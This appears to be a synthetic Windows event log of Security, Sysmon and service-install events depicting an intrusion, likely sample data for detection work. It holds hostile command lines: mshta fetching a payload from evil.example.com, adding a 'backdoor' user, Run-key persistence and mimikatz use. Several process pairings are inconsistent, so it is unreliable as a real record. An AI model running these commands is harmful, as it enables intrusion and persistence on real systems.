  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Service Control Manager" /><EventID>7045</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:44:30.0000000Z" /><EventRecordID>1998</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>System</Channel><Computer>DC01</Computer></System><EventData><Data Name="ServiceName">RemoteRegistry</Data><Data Name="ImagePath">C:\Windows\System32\cmd.exe</Data><Data Name="ServiceType">user mode service</Data><Data Name="StartType">demand start</Data><Data Name="AccountName">LocalSystem</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>13</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:44:31.0000000Z" /><EventRecordID>1999</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>JUMPHOST01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T18:44:31.0000000Z</Data><Data Name="EventType">SetValue</Data><Data Name="ProcessId">32524</Data><Data Name="Image">C:\Tools\mimikatz.exe</Data><Data Name="TargetObject">HKLM\SYSTEM\CurrentControlSet\Services\mal_persist\ImagePath</Data><Data Name="Details">net user backdoor P@ssw0rd123 /add</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4625</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:44:36.0000000Z" /><EventRecordID>2000</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC02</Computer></System><EventData><Data Name="SubjectUserName">-</Data><Data Name="TargetUserName">svc_sql</Data><Data Name="TargetDomainName">NT AUTHORITY</Data><Data Name="LogonType">3</Data><Data Name="FailureReason">%%2313</Data><Data Name="Status">0xc000006d</Data><Data Name="SubStatus">0xc0000064</Data><Data Name="IpAddress">203.0.113.45</Data><Data Name="IpPort">39440</Data><Data Name="WorkstationName">DC02</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4625</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:44:43.0000000Z" /><EventRecordID>2001</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-WEB01</Computer></System><EventData><Data Name="SubjectUserName">-</Data><Data Name="TargetUserName">t.miller</Data><Data Name="TargetDomainName">.</Data><Data Name="LogonType">3</Data><Data Name="FailureReason">%%2313</Data><Data Name="Status">0xc000006d</Data><Data Name="SubStatus">0xc0000064</Data><Data Name="IpAddress">10.0.1.12</Data><Data Name="IpPort">31947</Data><Data Name="WorkstationName">SRV-WEB01</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>1</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:44:54.0000000Z" /><EventRecordID>2002</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WKSTN-BOB</Computer></System><EventData><Data Name="UtcTime">2024-11-25T18:44:54.0000000Z</Data><Data Name="ProcessGuid">{0DDC9-11869-A28A-137B2}</Data><Data Name="ProcessId">22851</Data><Data Name="Image">C:\Windows\System32\powershell.exe</Data><Data Name="CommandLine">mshta.exe http://evil.example.com/payload.hta</Data><Data Name="User">NT AUTHORITY\alice</Data><Data Name="ParentProcessId">3828</Data><Data Name="ParentImage">C:\Windows\System32\regsvr32.exe</Data><Data Name="ParentCommandLine">wscript.exe C:\Users\Public\doc.vbs</Data><Data Name="Hashes">MD5=66d61ef522c2fb8fb8d83404791992b0,SHA256=5151861369d16a1ae441ae90655c5be51f2712236ec4363bd5f22569a852d6dd</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:44:58.0000000Z" /><EventRecordID>2003</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-BOB</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-9987-8229-3223-1001</Data><Data Name="TargetUserName">john.doe</Data><Data Name="TargetDomainName">NT AUTHORITY</Data><Data Name="LogonType">2</Data><Data Name="IpAddress">10.0.1.12</Data><Data Name="IpPort">49391</Data><Data Name="ProcessName">C:\Windows\System32\mshta.exe</Data><Data Name="WorkstationName">WKSTN-BOB</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4648</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:45:00.0000000Z" /><EventRecordID>2004</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-FILE01</Computer></System><EventData><Data Name="SubjectUserName">bob</Data><Data Name="SubjectDomainName">NT AUTHORITY</Data><Data Name="TargetUserName">alice</Data><Data Name="TargetDomainName">CORP</Data><Data Name="TargetServerName">WKSTN-CHARLIE</Data><Data Name="IpAddress">203.0.113.45</Data><Data Name="ProcessName">C:\Windows\System32\lsass.exe</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4768</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:45:30.0000000Z" /><EventRecordID>2005</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-BOB</Computer></System><EventData><Data Name="TargetUserName">bob</Data><Data Name="TargetDomainName">CONTOSO</Data><Data Name="ServiceName">krbtgt</Data><Data Name="IpAddress">::198.51.100.23</Data><Data Name="Status">0x25</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:45:46.0000000Z" /><EventRecordID>2006</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC02</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-5539-9864-3736-1001</Data><Data Name="TargetUserName">svc_sql</Data><Data Name="TargetDomainName">CONTOSO</Data><Data Name="LogonType">10</Data><Data Name="IpAddress">10.0.0.5</Data><Data Name="IpPort">50656</Data><Data Name="ProcessName">C:\Windows\System32\cmd.exe</Data><Data Name="WorkstationName">DC02</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4776</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:45:48.0000000Z" /><EventRecordID>2007</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-BOB</Computer></System><EventData><Data Name="PackageName">MICROSOFT_AUTHENTICATION_PACKAGE_V1_0</Data><Data Name="TargetUserName">SYSTEM</Data><Data Name="Workstation">JUMPHOST01</Data><Data Name="Status">0x0</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>1</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:46:11.0000000Z" /><EventRecordID>2008</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WKSTN-BOB</Computer></System><EventData><Data Name="UtcTime">2024-11-25T18:46:11.0000000Z</Data><Data Name="ProcessGuid">{0D9BA-DDCB-10EAB-143E1}</Data><Data Name="ProcessId">46609</Data><Data Name="Image">C:\Windows\System32\lsass.exe</Data><Data Name="CommandLine">reg.exe ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Update /d C:\temp\update.exe</Data><Data Name="User">CONTOSO\alice</Data><Data Name="ParentProcessId">540</Data><Data Name="ParentImage">C:\Tools\mimikatz.exe</Data><Data Name="ParentCommandLine">cmd.exe /c whoami &amp;&amp; net user</Data><Data Name="Hashes">MD5=e5790ffb109a90a045355b92c3f07705,SHA256=ad14d4aadc4d7746ce9a4a31c0a90c2c0d2c83d2e3252e280ad0f53b6d29cbbc</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:46:16.0000000Z" /><EventRecordID>2009</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-ALICE</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-5833-8550-2003-1001</Data><Data Name="TargetUserName">svc_backup</Data><Data Name="TargetDomainName">CONTOSO</Data><Data Name="LogonType">10</Data><Data Name="IpAddress">192.168.1.200</Data><Data Name="IpPort">30480</Data><Data Name="ProcessName">C:\Windows\System32\mshta.exe</Data><Data Name="WorkstationName">WKSTN-ALICE</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>1</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:46:37.0000000Z" /><EventRecordID>2010</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WKSTN-ALICE</Computer></System><EventData><Data Name="UtcTime">2024-11-25T18:46:37.0000000Z</Data><Data Name="ProcessGuid">{0C074-10427-75DF-4774}</Data><Data Name="ProcessId">55632</Data><Data Name="Image">C:\Windows\System32\cmd.exe</Data><Data Name="CommandLine">cmd.exe /c whoami &amp;&amp; net user</Data><Data Name="User">CONTOSO\svc_backup</Data><Data Name="ParentProcessId">7861</Data><Data Name="ParentImage">C:\Windows\SysWOW64\rundll32.exe</Data><Data Name="ParentCommandLine">wscript.exe C:\Users\Public\doc.vbs</Data><Data Name="Hashes">MD5=4691f301f43ddf2b7391e15f403ffe08,SHA256=c5a174881713d32cbe6f37afb8ccc8d7bb1e95e46b7e9c6bbd41c81b013eb715</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>12</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:46:42.0000000Z" /><EventRecordID>2011</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WKSTN-ALICE</Computer></System><EventData><Data Name="UtcTime">2024-11-25T18:46:42.0000000Z</Data><Data Name="EventType">DeleteKey</Data><Data Name="ProcessId">8106</Data><Data Name="Image">C:\Windows\System32\powershell.exe</Data><Data Name="TargetObject">HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Update</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4728</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:47:04.0000000Z" /><EventRecordID>2012</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-BOB</Computer></System><EventData><Data Name="MemberSid">S-1-5-21-9523-9697-6407-8422</Data><Data Name="MemberName">CN=charlie,DC=contoso,DC=com</Data><Data Name="TargetUserName">t.miller</Data><Data Name="TargetDomainName">CONTOSO</Data><Data Name="GroupName">Enterprise Admins</Data><Data Name="SubjectUserName">charlie</Data><Data Name="SubjectDomainName">NT AUTHORITY</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4625</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:47:09.0000000Z" /><EventRecordID>2013</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>LAPTOP-MGMT</Computer></System><EventData><Data Name="SubjectUserName">-</Data><Data Name="TargetUserName">john.doe</Data><Data Name="TargetDomainName">.</Data><Data Name="LogonType">3</Data><Data Name="FailureReason">%%2313</Data><Data Name="Status">0xc000006d</Data><Data Name="SubStatus">0xc0000064</Data><Data Name="IpAddress">198.51.100.23</Data><Data Name="IpPort">40757</Data><Data Name="WorkstationName">LAPTOP-MGMT</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4648</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:47:23.0000000Z" /><EventRecordID>2014</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC01</Computer></System><EventData><Data Name="SubjectUserName">svc_backup</Data><Data Name="SubjectDomainName">NT AUTHORITY</Data><Data Name="TargetUserName">SYSTEM</Data><Data Name="TargetDomainName">CORP</Data><Data Name="TargetServerName">LAPTOP-MGMT</Data><Data Name="IpAddress">203.0.113.45</Data><Data Name="ProcessName">C:\Windows\System32\powershell.exe</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>22</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:47:47.0000000Z" /><EventRecordID>2015</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WKSTN-ALICE</Computer></System><EventData><Data Name="UtcTime">2024-11-25T18:47:47.0000000Z</Data><Data Name="ProcessId">46892</Data><Data Name="Image">C:\Windows\System32\cmd.exe</Data><Data Name="QueryName">c2.badactor.xyz</Data><Data Name="QueryStatus">0</Data><Data Name="QueryResults">10.0.1.12</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4663</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:48:33.0000000Z" /><EventRecordID>2016</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-SQL01</Computer></System><EventData><Data Name="SubjectUserName">SYSTEM</Data><Data Name="SubjectDomainName">CONTOSO</Data><Data Name="ObjectName">C:\Users\alice\Downloads\invoice_scan.pdf.exe</Data><Data Name="ObjectType">File</Data><Data Name="AccessList">%%4417
			%%4418</Data><Data Name="ProcessName">C:\Windows\System32\cmd.exe</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Service Control Manager" /><EventID>7045</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:49:08.0000000Z" /><EventRecordID>2017</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>System</Channel><Computer>WKSTN-ALICE</Computer></System><EventData><Data Name="ServiceName">WinRM</Data><Data Name="ImagePath">C:\Windows\System32\wscript.exe</Data><Data Name="ServiceType">user mode service</Data><Data Name="StartType">demand start</Data><Data Name="AccountName">LocalSystem</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:49:26.0000000Z" /><EventRecordID>2018</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>JUMPHOST01</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-2369-6556-9602-1001</Data><Data Name="TargetUserName">t.miller</Data><Data Name="TargetDomainName">CORP</Data><Data Name="LogonType">10</Data><Data Name="IpAddress">192.168.1.200</Data><Data Name="IpPort">7154</Data><Data Name="ProcessName">C:\Windows\SysWOW64\rundll32.exe</Data><Data Name="WorkstationName">JUMPHOST01</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4672</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:49:28.0000000Z" /><EventRecordID>2019</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>JUMPHOST01</Computer></System><EventData><Data Name="SubjectUserName">admin</Data><Data Name="SubjectDomainName">CONTOSO</Data><Data Name="SubjectLogonId">0x1b44cc</Data><Data Name="PrivilegeList">SeSecurityPrivilege
			SeBackupPrivilege
			SeRestorePrivilege</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4720</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:50:24.0000000Z" /><EventRecordID>2020</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-SQL01</Computer></System><EventData><Data Name="SubjectUserName">svc_backup</Data><Data Name="SubjectDomainName">CONTOSO</Data><Data Name="TargetUserName">newuser243</Data><Data Name="TargetDomainName">CORP</Data><Data Name="PrivilegeList">-</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Service Control Manager" /><EventID>7045</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:51:23.0000000Z" /><EventRecordID>2021</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>System</Channel><Computer>WKSTN-ALICE</Computer></System><EventData><Data Name="ServiceName">Schedule</Data><Data Name="ImagePath">C:\Windows\System32\powershell.exe</Data><Data Name="ServiceType">user mode service</Data><Data Name="StartType">demand start</Data><Data Name="AccountName">LocalSystem</Data></EventData></Event>
  